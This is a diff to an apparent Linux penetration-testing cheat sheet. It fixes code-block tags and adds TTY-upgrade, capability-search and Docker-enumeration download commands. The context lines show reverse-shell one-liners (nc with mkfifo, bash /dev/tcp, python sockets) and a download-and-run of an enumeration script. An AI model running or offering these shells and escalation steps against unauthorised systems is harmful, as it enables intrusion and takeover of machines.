@@ -11,7 +11,7 @@
 - [Sudo](#sudo)
 
 ## Sudo
-```bahs
+```bash
 sudo -l
 ```
 
@@ -46,7 +46,7 @@ mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
 ```
 
 ### Dev 
-```
+```bash
 bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'"
 ```
 
@@ -57,7 +57,14 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ### TTY Support
 ```bash
+bash -i
+```
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
 script -qc /bin/bash /dev/null
 ```
 
@@ -114,11 +121,14 @@ $ gdb
 | `/proc/PID/fd`      | Directory, which contains all file descriptors. |
 
 ### Command
-
 ```bash
 find / -user user 2>&-
 find / -group group 2>&-
 find / -user root -executable -type f 2>&- | grep -v /bin/
+```
+
+```bash
+/sbin/getcap -r *
 ```
 
 ### Script
@@ -126,6 +136,11 @@ find / -user root -executable -type f 2>&- | grep -v /bin/
 curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
 chmod +x lse.sh
 ./lse.sh -l1
+```
+
+### Docker
+```bash
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O
 ```
 
 ## Command Injection
